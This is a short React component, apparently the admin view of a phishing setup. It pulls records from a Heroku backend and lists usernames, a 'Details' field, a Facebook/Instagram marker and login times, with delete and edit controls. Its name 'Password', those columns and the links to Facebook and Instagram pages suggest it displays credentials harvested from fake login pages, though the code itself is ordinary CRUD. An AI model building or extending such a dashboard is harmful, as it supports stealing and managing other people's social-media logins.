import React, {useState,useEffect} from 'react'
import axios from 'axios'
import './Password.css'
import { BrowserRouter, Route, Link } from "react-router-dom";


function Password(props) {


const [Products,setProducts] = useState([])

  useEffect(() => {
        const fetchProducts = async () => {
          const { data} = await axios.get(`https://backendaloginda.herokuapp.com/exercises`)
          setProducts(data)
          console.log(data)
        }
        fetchProducts()
        }, [])
        
        
const deleteRecord = async (id,name) => {
    await axios.delete(`https://backendaloginda.herokuapp.com/exercises/${id}`)
    console.log(`${name} deleted successfully`)
}
    return (
 <div className='cont'>
    <a href="/Facebook">Facebook</a>
    <a href="/"> Instagram</a>
<table>
  <thead>
  <tr>
    <th>Username</th>
    <th>Details</th>
    <th>Fb/IS</th>
    <th>Delete?</th>
    <th>Edit Record</th>
    <th>Login Time</th> 
  </tr>
  </thead>
  {
    Products.map((product, i) => 
    <tr key={i}>
      <td>{product.username}</td>
      <td>{product.description}</td>
      <td>{product.duration}</td>
      <td><p onClick={(e) => {deleteRecord(product._id,product.username)}}> Delete </p></td>
      
      <td>
      <Link to={"/edit/"+product._id}>Edit</Link> |
    </td>

    <td>{product.date}</td>
    </tr>
    ).reverse()
  }
</table>
</div>
    )
}

export default Password
